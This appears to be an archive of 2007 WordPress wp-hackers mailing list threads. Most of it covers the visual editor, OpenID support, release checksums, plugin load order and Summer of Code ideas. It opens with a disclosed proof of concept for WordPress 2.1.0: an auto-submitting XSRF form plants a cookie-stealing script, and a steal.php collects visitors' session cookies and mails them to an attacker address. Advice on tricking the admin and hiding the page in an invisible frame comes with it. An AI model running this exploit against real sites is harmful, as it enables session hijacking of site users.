If you're logged in into wordpress as an admin, your comments aren't
properly 
sanitized, thus allowing an XSS to be posted. Normally an admin wouldn't 
input XSS input vectors, but we can make them do it with a simple XSRF
script.

IIa. Affected Versions
----------------------

I'm assuming all versions <= 2.1.0 are vulnerable although I have only
tested 
the latest version (2.1.0). This should work in all browsers that have 
JavaScript enabled (default in most browsers).

III. PoC
--------

[code=sploit.html]
<form action="http://example.com/wp-comments-post.php" method="post"
name="commentform" id="commentform">
<textarea name="comment" id="comment">
<script>location.href =
String.fromCharCode(x,y,z,q,r,s)+document.cookie;</script>
</script>
</textarea>

<input type="hidden" name="comment_post_ID" value="**ID**" />
</form>
<script>document.commentform.submit();</script>
[/code]

[code=steal.php]
<?php
//Get the session id
$id = $_GET["id"];

//Send it to our e-mail
mail("evilhacker@yoursite.com", "Cookie stolen", $id);

//Save a backup
$file = fopen('log.txt', 'a');
fwrite($file, $id . "\n\n");
?>
[/code]

Notes: 
        - **ID** should be the ID of the commentpage in which you want to
           inject the XSS. 
        - Replace 'String.fromCharCode(x,y,z,q,r,s)' with the appropiate 
          integers which lead to steal.php (you can look them up in an ASCII

          table).
             eg: http://yoursite.com/steel.php?id=
 
String.fromCharCode(104,116,116,112,58,47,47,121,111,117,1
	
14,115,105,116,101,46,99,111,109,47,115,116,101,101,108,46
		    ,112,104,112,63,105,100,61);

           We need to do this because Wordpress does escapes quotes.
                
We trick the admin into going to our sploit.html page (should be fairly easy

using basic social engineering skills). It is recommended that you hide the
page 
in a frame with no height, more stealth options are beyond the scope of this

advisory. Upon entering the page, the admin will post the XSS input vector
as a 
comment. Herafter he and EVERY other user that visits the page with comments
will 
automatically submit their session_id's to you.

We've had a lot of activity in trac, so we'll concentrate on rolling
through the  existing tickets, confirming them as bugs, and working on
fixes.  Most of the patching  will be done against  2.2, but we'll
also decide if anything needs to be milestoned for 2.0 or 2.1.

We'll also do some testing against recently changed stuff to see if we
can break anything.  The jQuery and JS localization changes are two
areas off the top of my head we could focus on.  General regression
testing and free-form testing are also welcome.  Whatever you want to
contribute, we'll take.  :-)

You say "mangled," I say "encoded." That is the intended behavior for
the Visual editor. We gave up on guessing authorial intent and gave
you a Code editor for entering code explicitly.

Hate to cut a fine point on this but by "Encoding" valid elements in tinymce in effect we have removed the ability of entering say <strong>test</strong> in the visual editor and instead either the user is forced to instead click on a relevant bold button or switch to a "code" view to enter the text and of course  the other effect is any author who wants to extend valid HTML elements, will have to add additional buttons to the TinyMCE button bar to represent these new elements or expect the user to instead switch to the code view as entering those elements directly in the visual editor will NOT work.

I can work around this, but clearly I am scratching my head over why in the heck this is a good behaviour..

The Visual editor is for typing in exactly what you want to appear on
the blog. The Code editor is for entering HTML code. I cannot clarify
that any more.

But in the process, we've lost something.  I have to agree with the
original poster.

I use the visual editor, but also add my own <div>s and such.  I get the
advantage of having a nice link dialog, a single button for blockquotes,
bold, italic, etc.  Now, if I have to type in all the HTML, well... as I
said, we've lost something.

What exactly was the problem that was being fixed here?  Were people
trying to get < and/or > in their text and not understanding they had to
use &lt; ?  Is it possible to hook that behavior for those of us who
have lost something?  I would be happy to write a plug-in that would
"unfix" this behavior for those that want it...

Egads, it's like it's 2005 all over again.

We hashed this all out when 2.0 shipped as an alpha - the visual
editor is WYSIWYG for those who could care less about the difference
between a <div> and a <span> and want "<" displayed when they type
"<".

The option to switch between the two modes, as added in 2.1,
effectively makes any arguments against the visual editor null and
void.  How exactly is giving a non-HTML-savvy user the ability to
output good HTML a BAD thing?

What was lost was the ambiguity between editing modes.

This is another difference between strict and transitional XHTML. In 
strict XHTML blockquote cannot contain raw text. the declaration is:

<!ELEMENT blockquote %Block;>

In transitional XHTML the declaration allows raw text:

<!ELEMENT blockquote %Flow;>

Agreed.

And the stock price for the Tylenol corporation dropped the very next day.

You can't deliver a consistent UI when it follows inconsistent rules.  This
will be better for all new comers to WP.  They will clearly know what the
can and what they can't do...

We've been talking what to do with this.  The current plan is to use
the comment_form hook to nonce comments for users with unfiltered_html
privs.  If the nonce is missing or invalid, the user will be stripped
of unfiltered_html and the comment will go through strict kses.  This
should accommodate themes that lack the comment_form hook.

I would like to eat a little crow here.  I thought the change was
different than it was, and shouldn't have commented before trying it out
fully.

The editor still does allow a sane human to put in perfectly valid
HTML... I thought it would eat all tags.

To quote Rosanne Rosannadanna: "Nevermind".

I can see from a blog poster point of view that is also pretty confusing as entering valid WPG2 tags in the visual editor = tags being encoded = tags not being handled = no photos..

I will freely admit I was unclear on how tinymce handled valid HTML tags,  I had assumed that tinymce would not encode valid HTML tags, a bad assumption to make thus when I started to get posts about tags not working my first assumption was the tinymce valid html hook was broken not this is a valid behaviour when using the visual editor..

Like all things, once you know the rules you can clearly document what to do..

This needs a check to make sure OpenSSL support is compiled in.
Checking for the existence of one of the functions at

They are very popular among plugin and theme authors, so I think we
will continue to distribute them and make them available via the
script loader.

Subject: [wp-hackers] Should OpenID be in WP core?
Message-ID: <45EF096A.6030002@torrez.us>


WP-Hackers,

I'm new to the list but I'm a WordPress user and developer (helping with
Atom Publishing Protocol - app.php) and have been following the OpenID
[1] development for which I would like to restart the discussion
[2,3,4,5,6]. See also [10]

OpenID is an open, decentralized, free framework for user-centric
digital identity. The purpose would be for users to authenticate for
both publishing entries and comments in WordPress installations. Very
similar to what TypeKey does, except in an open non-proprietary way.

There's currently an open ticket on Trac [7] to support OpenID for both
accounts and comments. In the comments you'll notice a great start [8]
from Alan J Castonguay. I think that it's fair to say that we could wait
and see for the adoption of the plugin before adding it to core, but I
think that it'll take a long while before we have enough users using
this style of adoption.

If WP were to have this in the core, it should not only be a consumer,
it can be an authentication provider, so if I blog at http://torrez.us/
then I can use that identity to comment on any other OpenID-enabled
WordPress and many other sites that are starting to offer OpenID support.

If you would like to see how simple is to support OpenID providers, you
may read Sam Ruby's post on OpenID for non super users [9].

Also, it's worth noting that WordPress.com is already a provider of
OpenID identities [11].

Anyways, I'm just trying to restart the discussion.

Before anything else, I should say that I have never used OpenID so far,
although I have read a couple of documents on OpenID (including the
specs), and I believe to mostly understand what it is about.

As for me, I don't think it's a good idea to put OpenID support into the
WP core. A proper OpenID implementation is everything else than trivial,
even if you only want it to act as "Consumer".

OpenID in the WP core would require a set of properly implemented
authentication mechanisms like Diffie-Hellman key exchange. If you make
the slightest mistake, you risk not only the End User's security but
also the Consumer's. On wordpress.com this might be ok, as they have the
possibilitiy to instantly upgrade all installations. But once you
distribute a broken OpenID implementation, you must consider that a
relatively large part of installations will take days, weeks and months
to upgrade to a fixed version.

Besides, I have to admit that I'm still very sceptic of OpenID. For
example, it leaves protection against techniques like DNS spoofing to
the implementations on both sides. Also, it appears not to take any
measures against MITM attacks. It is to say that the OpenID specs
recommend HTTPS in order to increase security and circumvent some of the
problems, but that's of course not an option for WordPress.

Alex

It would be interesting to know whether it would be possible to
implement Open ID via a remote server - e.g. using Wordpress.com or
Wordpress.org to actually handle the login-checking then serving a
confirmation back to installed wordpress.

I agree. Personally, I would prefer to see WordPress (especially .com) allow
users to use external OpenID credentials.  It seems like everyone wants to
be a provider right now.  What good does it do me if my AIM name, my Yahoo
account, my MSN account and blog are all OpenID credentials?

As someone who often pushes Wordpress into odd not-quite-a-blog CMS-y 
roles, I don't really think that OpenID support should be in core 
either. However, I /do/ think it should be a default plugin for WP, WPMU 
and WP.com, both as identity provider and consumer. If there's 
limitations of Wordpress that can be solved with more hooks, we should 
go that route.

There's some UI considerations, in particular, that I think need to be 
addressed, especially with the comment form area. Maybe someone in 
-hackers has the user-experience/-interface juice required.

All the code[8] I've pushed out is available under a Modified BSD 
License, which can be eaten by a GPL project without issue. So, if 
anyone wants to take any of that code, feel free. It really needs some 
cleanup, and a whole lot of backwards-compatibility junk for 2.0.x could 
be removed.

I think that OpenID support is more of a job for a Plugin, not the WP Core.
Since, that way, you can choose to use OpenID or use WP's setup.

If this does ever make it into the Core, it'd be nice to have an Option on
whether to use it or not, plus, have an option to just use it for Comments
(since I don't think it's all that useful for actually logging in as a
Subscriber...

Maybe a few people who have experience with OpenID should step up and write
a great OpenID Plugin for WP? And, if the plugin is good enough, maybe it
can come with the WP downloads?

G'day,

I'm not an expert in the technical ins and outs of Open ID, but I think 
it's a great principle, so I'd vote to implement it. At this stage, I 
think it makes more sense as a plugin, but I do think it would make a 
good standard plugin. Maybe even part of the install "Do you want to 
enable the OpenID plugin for authors / commenting?".

My tuppence worth,

Cheers - Callum.

Yes, a plugin, but no messing with the simple and easy to use Installer...
It'll just confuse people (less technical savvy people), so it would be best
as a plugin like Akismet, it's included, but you choose to activate it or
not. That's my opinion, at least...

Why isn't there a md5 sum posted for every build? That way, the
compromising of the download package could have detected earlier by
simply checking the md5's. Obviously, the md5 sums shouldn't be
located on the downloadlocation only, but also on the mailinglist.

Yes, I think it should be a plugin. I don't think it is a good idea to
force people to use something (which would be the case if WP
implemented it as the one and only authentication option for WP).

There are md5sums for all downloads here:
http://wordpress.org/download/release-archive/

To be fair I think we need to go a step further now and have the releases
signed by a special pgp key to provide something that a hacker should not
be able to modify even with access to the server.

Afterall, if he has enough access to change the files then he can surely
change the md5sum too.

I definitely sense the consensus here. I definitely forgot about the
option of a default plugin like Akismet. I probably misused the word
core to just mean by default. I also never intended to be the default
and only authentication option for WP, just an additional.

I do think that *parts* of the plugin should be enabled by default, like
the ability to authenticate for comments. Also, I saw a good idea for
not embedding the OpenID provider code in WP, but delegate to
WordPress.com just like we do for Akismet. That part of course would
need post-install activation like Akismet, since you have to register
for a WP.com account. But I repeat, OpenID for comments enabled by
default could be the best thing for our money at this point.

Also, on the "not the only authentication option for WP" point, I was
thinking more like, you login into WP like today, *but* that enables
your OpenID provider session for which you can now use your WP OpenID
URL to authenticate to other systems.

Thanks everyone for your answers and I'm also available to help in any
way needed. How do you guys go about making a decision? Is it by vote or
in the hands of the committers?

But 99.999% of the people downloading won't be verifying neither of
those security options: md5 or pgp, right?

Way late on this one, but I have to agree with the others... I really 
think it should be optional, with the use of a plugin. Not in core. ;) :)

AFAIK, usually by "mass" decision, made by the devs/coders, and the 
masses on the WP-lists?

I have to ask though and it's early and I haven't had my coffee yet so
bare with me.

Would OpenID take the place of controlling who had access to my own
blogs or would that just be the method of signing in for those whom
I've allowed access?

Thanks,

OpenID just provides an identity mechanism, not an access control one.
So yes, only a method of signing in for those who you have given access.

For example, on comments, the first time someone posts with a OpenID
identity it goes in the moderated queue. If you approve it, then we
could say that you've allowed her access for future posts and these will
no longer get placed in the moderated queue.

As I said in my first message, I haven't used OpenID so far, but have
read a bit about it.

However, especially with the comments, this gives me the following
question: Let's assume I'm a spammer. I would go to your form and just
enter *some* URL which I assume could be involved via OpenID. I could
increase my success rate by checking which other URLs have already
commented on this article or blog.

By the way, wouldn't this try'n'error method just work with any OpenID
based authentication? Or is there a major point I'm missing?


Regards,
Alex

I don't know everything about OpenID either, but this is what I
understand. In order to sign-in with OpenID is not just about entering
the URL, there's a 3-way dialogue between the RP, your provider and you.
The blog receiving the comment, will redirect you to your provider where
you authenticate directly with (most likely user/pw or cookie) then the
receiving blog will get an authenticated identity from the provider.

I don't think that spammer bots can just go enter a "valid" URLs and get
away with it, I think that would make OpenID very stupid. I said that
once you have approved an identity (URL), future posts don't get
moderated, but they still get authenticated with the same dialogue above.

Maybe.. read above and let me know if I didn't get your question.

-1 for OpenID in core. -1 for bundled plugin. I really like OpenID,
but I don't think this is a feature that will appeal to a large enough
percentage of end users to merit bundling.

Indeed.

You can lead the horse to water but you can't make it drink.

However, some people do care about this, and it will improve WordPress's
reputation with them - http://bugs.gentoo.org/show_bug.cgi?id=168529#c4

Message-ID: <45F04E4E.2050308@poplarware.com>

In the Codex article on Reporting Bugs (which I just overhauled), I 
came across a piece of information (put in by a previous author) that 
said I should receive email if I create a Trac ticket, whenever that 
ticket is updated.

I have created several tickets, and my email address is listed in my 
profile for the forums. Yet I have never received any email from Trac. 
Is this feature broken, or do you have to do something else besides 
being the reporter to get notified of changes?

Let me know and I'll update the article with the correct information...

Thanks,

I've noticed this too but since I hadn't read the documentation 
(properly) I simply CC myself into my tickets and that works for me.

Do you have to put in your email address or just your Trac user name?

I put in my email address in the WPMu ones.  A quick test shows that
it will take your username and it does send you the email.

Hmm, nice to know for future use.

Hope this helps,

It would be awesome to have a few more mentors and your ideas.

I am not eligible to be a student for the SoC. If someone would like
me to mentor, I would be more than happy to, as there are not the same
restrictions on mentors as there are on students. (If you're wondering
why, I'm under 18, I'm not in college, that rules me out).

I was just going to look into this more today, Last time google SoC came
around i looked at the list of organisations, and honestly, couldnt see
any that i could actually help with, now this year i've been playing with
wordpress a fair bit, i might apply for it.. Just need to work out what
"task" i can do..
I mean, sure theres a lot listed on the Ideas page, but honestly, a fair
chunk of them are only small things, or are things which have been debated
over(OpenID for example).

Would anyone on here (rather than end-users) have any ideas for potential
students? for example:
   * Making sure that wordpress(And certain plugins) are xhtml valid, and
that can be serves with application/xhtml+xml (Which many dont use yet,
however, we should be moving towards that).
   *Perhaps creating a plugin update alert, could be included on the plugin
activation screen and have an extra field with the latest version number
in red if newer than the current plugin, The plugin model could be
extended to either have an extra field for retrieving a text(or xml) file
  from the plugin developers website of the latest version for that plugin,
or maybe it could be hosted on a WP server, where plugin devs can modify
it.
   * OpenID plugin, Ok despite the discussion, I honestly feel it should be
an optional default plugin, people can rant about it in the other thread,
but take a look at this for example:
http://faq.wordpress.com/2007/03/06/what-is-openid/ It'd be great to have
an option to submit OpenID comments on ALL wordpress blogs, WP.com has
started this, they allow WP.com blogs to be OpenID Identities, Thats good
enough push for me. (I gurrently delegate my glod to myopenid.com or
something with another plugin)

Ok so the last 2 are mainly ideas from the forum. but still stands, do the
devs have any core-issues(or enhacements) they wouldnt mind seeing someone
deal with?

I guess before we get to the bundling question, it's clear that a plugin 
is the way to go, so is there anyone interested in building a plugin?

I'm happy to put in some time, but I'm not particularly familiar with 
OpenID, so if anyone wants to collaborate...

Cheers - Callum.

There are allready a few OpenID plugins,
notably:http://verselogic.net/projects/wordpress/wordpress-openid-plugin/

The problem it seems with that at present, is that it requires creating  
user accounts behind the scenes when a new openID user logs in.
Idealy with openID, you dont want to create an extra account for them, but  
aparantly, your forced to due to the way WP handles users(or something, i  
cant find the reference for that right now).

You might be better off just taking that plugin and extending/cleaning it  
up, i believe the author of that may've commented either here, or on trac  
about it sometime recently too.

I'm not sure this is a problem - or specific to Wordpress. I'm not
sure how a system would manage local rights management any other way -
there will always need to be a local account (record) of some sort.
The Open ID system only manages the authentication of the users while
it is the Wordpress system itself that applies the rights.

I haven't looked at that plugin yet so I could be getting the wrong
end of the stick?

I think I saw that message fly by too. Add me to the pile of people
interested in development of this too.  I know next to nothing about
Open ID implementation but from the sound of it we're talking about
improving interface and tidying up code rather than core
functionality.

Right. The author is Alan Castonguay. I'm also volunteering to help with

I certainly think it's good to revisit how an openid consumer should 
handle openid/local/anonymous commenting.

I've tried making anonymous-ish comments with the comment-type extended 
like {comment,trackback,pingback,openid}, or a new column on the 
comment's table, so that it can be styled differently. However, that 
leaves certain other use-cases high and dry, like blog authors / admins 
logging in with OpenID. That might go mostly unused for a personal 
single-user blog, but certainly would be good to have in a MU 
environment. So, I used the built-in role system to create local users 
with the Subscriber role. It seemed the best fit, at least for 
standalone. Is it too much overhead?

The whole Theme/Plugin installation system ideas might be a great SoC
project to do. I'd personally love to mentor that one as I have spent
a lot of time thinking and planning and even starting one, but
unfortunately it never got finished, and I think it is something
essential for future versions of WordPress. Its not a lightweight
task, definitely something that will take a good chunk of code and a
good amount of time testing, so it would be the perfect SoC type of
project if someone is interested.

This (below) looks like nothing, but I'm forwarding it to let people know

What an idiot. Any PHP error does this.

Also, it isn't a security hazard at all (you could guess the directory
structure eventually, anyways) and Trac might have been a better place.

How does SQL tie into that, either?

A lot of files that are normally included have no code in the global 
space, only in functions. admin-functions.php is an exception. This is 
for the variable '$wp_file_descriptions', which seems to only be 
accessed by the function get_file_description() 
http://trac.wordpress.org/browser/trunk/wp-admin/admin-functions.php#L1617.

Is there a reason that $wp_file_descriptions is defined in the global 
namespace?

Nothing to do with SQL here though..

It's just another security measure, it may help those who know how to take
advantage of it, the rest may not be interested in using it but when the
rain comes you can always say... we had a bullet-proof NASA-signed security
framework to avoid that :P

Actually if you care enough, you won't download the file, you would just
update from svn. If svn gets compromised as well, there we have a problem.



 that may help you, most of the time this could be used to blame the user
for beeing hacek cost nothing to implement.

My understanding of OpenID is that it's meant to be a replacement for a 
password, you still need an account on the site and you still need to 
"log in" like you normally would. I left a comment on an OpenID enabled 
blog the other day, here was the workflow:

1. I put in "matt.wordpress.com" instead of filling the three boxes for 
name/email/url, and I wrote my comment.
( I was logged in, else I would go through something else*. )
2. I press "comment" and it redirects me to matt.wordpress.com and asks 
me if I want to "trust" the blog, no, just this time, or always.
3. It then loaded a page with my name/email/url pre-filled, still on 
WordPress.com, and asked if I wanted to give this information to the 
aforementioned blog.
4. I said yes, and I went back to the comment page and everything was 
posted.

* If I hadn't been logged in:
1. The page tells me I'm not logged in, but doesn't give me a link to 
login because of phishing. I'm asked to go to a bookmark or type in 
WordPress.com.
2. I type in the URL to login.
3. After I login and it redirects me to my admin page, a little notice 
says there's a openid thingy in progress, and has a link.
4. If I click the link it puts me back to #2 above.

This is similar to what I did when I registered for ma.gnolia.com or 
Zooomr with OpenID. I still have accounts at both, just no password and 
"matt.wordpress.com" is my username .

I didn't mean what I said as an argument against OpenID, just that the 
user experience can be clunky sometimes. I don't know who's going to 
improve that, but if it can be WP I'd be all for that, if there any 
plugin hooks that are needed let me know.

Hello,

Arguments agaisnt OpenID are maybe valid, maybe not, I'm very far to have
the required knowledge to say that.
But OpenID can be a interesting link between the mothership
wordpress.comand the personal WP installations, and perhaps a low
profile way to greet wp
by doing a little advertising for wordpress.com.

I did that on my web site (audioblog.fr), not saying it's about OpenID, but
just proposing two ways to publish a comment :
- you have a wordpress.com account : you can use your wp.com url,
- you don't have one you use the regular comment form.

My two cents

Subject: [wp-hackers] WordPress Update Options failes
Message-ID: <200703091614.11570.hovenko@linpro.no>

I can remember those days (around v2.0.5) when I could in "Options - General" 
just enter the folder name, relative to webroot, to where I installed 
WordPress and then hit "Update Options".

I can't seem to remember on which version this stopped working...
I'm now using v2.1.2 and if I enter "/blog" into both "WordPress address" 
and "Blog address" fields and hit "Update Options", I get this error message:

===
Warning: parse_url(http:///blog/wp-cron.php) [function.parse-url]: Unable to 
parse URL in /var/www/htdocs/blog/wp-includes/cron.php on line 85
===


The frontpage do load, but without any style and giving me a 404 Not Found.


It seems that WordPress automagically adds the http:// part if it is missing.
The siteurl and home values in my database is now set to "http:///blog".
The site works perfectly when manually updating the database with "/blog".

Subject: [wp-hackers] HTTP status code on "Release not found" at wp.org
Message-ID: <1173466011.13757.12.camel@localhost>

Hi,

this might be a question rather for the wp.org server admins, so I hope
it's ok to post it here. I don't really know where to refer to, and I
know that some of the responsible people read this list.

I'm building a plugin which among other things downloads a given WP
version from the URL http://wordpress.org/wordpress-XXX.zip using the
Snoopy class. This works fine so far; only if one downloads a version
that doesn't exist, it returns the string "Release not found. XXX" and
-- here comes my problem -- HTTP status code 200.

Of course, I could parse the string, but this is not very reliable. A
better method would be a proper status code, preferably 404. Would that
be possible?


Regards,
Alex

If you provide a solid problem oriented idea, then I should be able to
guilt someone into mentoring you ;-) Each of the ideas you present
seem solid. A more experimental idea could also be a great experience.

Matt also added some performance related ones to the ideas page today.
A couple of them look challenging, but the experience and the benefits
are significant!

This one seems like an easy win. Nick Shanks has filled quite a few
related bugs for core in this area.

There are many related discussion threads and bug reports that I can
help track down if you are interested.

Preventative measures might be interesting.

I think Mike A (for bbPress), Mark J, (westi,) and others have related
projects at various levels of functionality and adoption. You could
look at what they have done and where they are heading and collaborate
with them.

Well, there are already plugins to do both the intermediary service

Some other areas to consider if submitting your own idea:
    * Improve Administration Interface
    * Batch Categorizing/Operating on Posts
    * Draft Handling
    * Editor
    * Image Handling
    * Smoother Upgrade

Apart from breaking the feed URLs, WP tends to work perfectly when doing
that, and there _are_ valid reasons to do so (e.g. front-end HTTP and
back-end HTTPS) but it seems WP knows better.

This is an interesting solution to the phishing problem.  I wonder  
how effective it will be.  It's pretty much counting on people  
getting so used to having to type in the address to get the login  
form that internal alarms will go off if they see a WP.com OpenID  
login form without having first manually typed the address or clicked  
their bookmarklet.

It may act as a Club solution... send OpenID phishers off looking for  
easier prey.  What are LiveJournal/6A/AOL doing to help prevent  
phishing of their OpenID solutions?

But discounting any deterrent factor, I'd guess it would have a  
measurable, but not overwhelming effect on the issue.  I don't think  
that one site is going to be able to erase years of "1. see login  
form that looks familiar 2. type in your user/pass" conditioning.

And I, for one, would like to see OpenID (client, not server)  
implemented in WordPress.  Maybe first as a bundled plugin, and then  
as core functionality.  It certainly makes turning on "registered  
users only" commenting an easier decision on your users.  I hate  
signing up for new services, but I'd be happy to spend 5 seconds  
clicking an OpenID "Allow" button.

I think this is a good idea anyways. It is the equivalent of a 404 error,
just that the fancy rewriting script doesn't send a 404.

Instead of the overhead of a regular expression, why not use rtrim?

function untrailingslashit($string) {
  return rtrim($string, '/');
}

Agreed that client is the most desirable first step, however without an
identity there'll be less take up on this. It's like Akismet without a
key. Therefore I think we also need to make it easier for people to get
either a WP.com account or host their own identity.

Pretty much everyone already has an identity now, what with AOL being a
provider now (all you need is an AIM account).  Yahoo accounts can be used
with http://idproxy.net.  Soon, Microsoft is going to start providing them
for anyone with a PC.  I don't mind WP being an identity provider, but the
client is what's really interesting for me.

Moreover, no-one needs to run their own identity provider to turn a
blog into an OpenID. That's what delegation is for.

You mean, for anyone with Windows. Most likely only Windows Vista.

Windows, though ubiquitous, does not encompass the _whole_ PC landscape.

You're right. I usually refer to Windows boxes as PCs, Macs as Macs and
Linux boxes as...well... linux boxes.  It's all John Hodgman's fault.  I
don't know what MS's plans are for XP users, I'd be shocked if they thought
that their identity system was too good for them :).

Anyway, without signing up for any, I found myself with four OpenID identity
providers (now that WP.com has implemented it).

OpenID will be implemented by Microsoft to be ONE(of many) authentication  
method supported by CardSpace.
Cardspace has been described to me as like a Wallet, When you want to log  
into a website, if you've got a "card" in your "Cardspace"(Wallet) that  
can identify you to that website, you click that card, and it logs you in.
Its not to Replace the Passport system, rather cardspace is to allow a  
single place to store multiple authtication details.
 From the little i've heard, it sounds like its going to be an Windows-IE  
companionship, So it might be useless to no-IE users. (But that may be  
wrong)

Its included in Vista from what i can see, And will be offered as a Add-on  
for XP from an article i just read.

Hi,
  I do not know this is the right place to put this question or not. 
   
  Question:
  Does wordpress allow use of javascript for plugin authors from other services, I mean like adding a remote javascript file from a different server to that of wordpress server. I did something like that. The div object returned is totally misplaced it goes to north-west of the browser, though I followed complete plugin Api rules.
   
  These are the rules I followed
   
  function seed_adminmenu(){  
        add_options_page('To Options', 'Test', 10, 'test', add_mu');                                          
        }
}     
  add_action('admin_menu','seed_adminmenu',10);  
if (isset($_GET['activate']) && $_GET['activate'] == 'true') 
 {                                                   
   add_action('init', 'truth');
 }                             
  The rest of the code is written in the add_mu
   
  Kindly let me know
   
  Thank You

I'm not sure I fully understand the question.

Posting a link to the plugin code may help make it clearer.

I assume you are only want to do this on plugin activation?  If so don't 
do this - use the plugin activation hook instead:
See register_activation_hook($file, $function) and 
http://wphooks.flatearth.org/hooks/activate_plugin-filename/

  No, My Plugin is activated. I include a remote javascript file when in my add_mu function. Onclicking  an event the remote javascript is called which outputs a div object. Now when I'm trying put this div object back it gets misplaced. It appears always on the top-left of the browser both on IE and Firefox.
   
  The javascript output file being remote, I doubt the div output given by this is getting misplaced as the file is not hooked.

Message-ID: <45F41310.6060904@ntlworld.com>

Hi guys,
Re: Wordpress latest version 2.1.2
Visual Rich Editor is enabled, appears for Posts, but not for comments - 
is this intentional, and if so, why?

Sorry if this is wrong place, but I have seen several queries elsewhere 
and no statement of current situation!

Manage Posts/Edit : shows the 2 tabs, Visual/Code
Manage pages/Edit : shows the 2 tabs, Visual/Code
Comments/Mass edit mode/Edit - shows basic code editor only - and no tabs
View Mode doesn't seem to do anything?
Edit (single) comment : shows basic code editor only - and no tabs

I am building a club website where there will be several users who don't 
know html - surely they can edit (their) comments using the Visual Editor?
(and yes, I have the Rich Editor selected in all the user profiles, and 
checked under both FFox and IE6.

Please can an expert advise whether this is "correct"?
Thanks

Subject: [wp-hackers] plugin loading order (rfc)
Message-ID: <45F425D4.6030808@m0n5t3r.info>

ehlo list

While working on a plugin, I hit an interesting issue: there is no other 
way to alter the order in which plugins are loaded than changing the 
file name.

Does anyone else feel the need for a plugin dependency system?

Here is my idea on how to do it:
 * every supporting plugin advertises the functions it can provide and 
the functions it needs (apart from the WP core ones, which we can safely 
assume are there)
 * when building active_plugins, we take the information above into 
account.
 * also, the plugins could advertise "external" dependencies, like 
certain extensions (mbstring, curl come to mind) or functions (hosters 
usually disable some functions like the popen, system, etc.)
 * if the requirements are not fullfilled, the plugin is not activated

Linux  package managers have been working like this for ages. By doing 
it at activation time, there is no performance penalty for the normal 
site usage, and we also avoid breaking wordpress because of syntax 
errors/missing functionality.

As the subject says, this is a request for comments, I want to have a 
little design phase before getting my hands dirty :).

Um, has never been for the comments.  It's always been the normal editor.

You can change this though with a plugin:

http://zy.ca/wordpress-plugins/wysiwyg-comments

You may want to search the wordpress.org forums as the topic comes up
from time to time.

And I won't give you my opinion of TinyMCE... :)

Hope this helps,

This is true.

Why do you need to change the order in which you plugin is loaded 
compared to other plugins?

All you should be doing when you plugin is included is:

  1. Defining functions / classes.
  2. Defining functions to replace those in pluggable functions.
  3. Calling add_action to add yourself to a suitable hook(s) to run 
other code on.

The only reason why you need to get the order correct is if more than 
one plugin is trying to override the same pluggable functions - and then 
you are probably not both going to work at the same time anyway.

If you need to check for existance of other pluggins do in on the "init" 
hook - i.e. once everyone is loaded.

Actually it's come up a couple of times in WPMu land when folks are
running 2 different anti spam programs.

hmm, you have a point; however, there are other benefits to adding some 
checks at activation time (improving user experience is one of them: you 
would increase chances that if a plugin can be activated it will 
actually work).

If you want to do some checks at activation time and block activation 
then you can do this with a plugin activation hook and dieing inside the 
activation hook.

We could provide a way for a plugin to provide an error message in this 
case as an enhancement.

Could you expand this issue / or link to an example of the problem.

I'm not sure how allowing control over the include order of plugins 
gives people any benifit apart from wining in the pluggable function 
definition battle.

As there was no reaction on my request, I have solved it differently now
(by checking the file size). However, a 404 would be much nicer, so if
someone could solve this one day, it would be great.

Btw, I'd like to do some advertisement, too (for the actual subject of
this issue): http://www.zirona.com/software/wordpress-instant-upgrade/

oh well... I was aware of the activation hooks, but a standard way of 
doing things would still be nice (and enforcing some checks wouldn't 
hurt - how many well coded plugins have you seen?)

I have been following the OpenID "open your arms and embrace it" thing
out of a lot of curiosity. I am sure it is a good thing. A convenient
thing. I am just not sure I get it right, but here are a couple of
things that don't sit with me as a "normal" user:

1. To login to my site as a publisher, I need to depend on an external
authentication site. If this is right, then I don't need my digital
identity, because I already have one and it resides in my own
WordPress db.

2. Dependancy on an external authentication site can put a lot of
logins in a limbo if they are down / out for some reason.

On the other hand, if you're saying my WordPress site itself begins
acting as an OpenID site (i.e., my login to the admin becomes my
digital key to everywhere on the net), then, there might be some hope
in it after all.

So tell me, is this what you're proposing and not like TypeKey, which
is an external site and service?

I'm suprised there isn't a "secret message" "these are the x and x
characters in your password" (or similar) style protection in use
instead. It would seem less hassle (and as secure?) to displays a
message known only to the user / OpenID so the *server* can confirm it
is the real thing to the user. This is one of those places where the
trust needs to be proved in both directions...

Thanks Mike!
I will look at that, although I am not very impressed with the TinyMCE 
either - but I don't know of a good replacement that works with WP 2.1.2 ?

I tried WYSI-Wordpress, which adds some extra features (image handling 
it says..) but it is based on an old version of TinyMCE and does not 
have a "More..." button, which my authors will want.

If you have any suggestions for a better integrated editor plugin, I 
would be _very_ happy to know this! :)
Thanks again for the reply.

I can think of one possible use. A plugin I use makes a multi-lingual 
blog, in part by having the locale of WordPress be dynamic. During the 
load, so that it happens as early as possible, the plugin figures out 
what language the user wants to view the blog in, and then sets the 
WordPress locale.

The problem is that other plugins could call load_plugin_text_domain 
during their load phase (to load their internationalization). So if 
they are loaded before the multilingual plugin, they will have loaded 
the wrong locale. Maybe there is some way to reset their text domain 
to the right locale, but I can't figure out a very smart way to do it. 
So ensuring that the multilingual plugin loads first would be good.

Or, ensuring that the plugins wait until later to call 
load_plugin_text_domain, but that is up to the plugin author...

Xinha for WP plugin: http://baptiste.us/plugins/xinha4wp

There was even discussion about replacing TinyMCE with Xinha, a hell of a
lot better WYSIWYG editor:
http://comox.textdrive.com/pipermail/wp-hackers/2006-November/009715.html

It integrates great (by default) with the post form and the comment form.
See it for yourself (and how nice it fits in) the comment form @
http://neosmart.net/blog/ where I'm using my own version of that plugin.

Won't a simple require_once() command take care of it?

Say plugins X and B require plugin M.

Plugin B loads. First line of code has a require_once for a known plugin M 
require_once("m.php");
It's not loaded yet, so it gets loaded as a part of this routine.

Plugin X loads. It needs plugin M, which is already loaded.
require_once("m.php");
It's already loaded, nothing happens.

The only requirement is that you know the path to plugin M. But even if you
had a dependency system, you'd still have to know something about plugin M
to require it anyway.

Try pinging Matt directly.  Or maybe Ryan (who is not engaging in

Such a solution, used by banks and others, only works if the username  
in question is a secret.  You provide the username, they provide some  
piece of "trust" back to you based on the username, and then you know  
you can provide your password.

OpenID depends on your username being publicly available.  So  
everyone knows that my OpenID is markjaquith.com  Thus, any trust  
token shown to me at my login prompt could be spidered by phishers.

Refusal to show the login prompt unless you manually type in the  
address is a pretty good solution.  Like the trust token, it gets  
people used to a certain behavior.  (a) they see their trust token,  
then they enter their password.  (b) they type in their OpenID  
provider's URL, and they enter their password.  Either way, you're  
trying to get people so used to doing it the safe way that when it  
changes, their brain slams on the brakes.

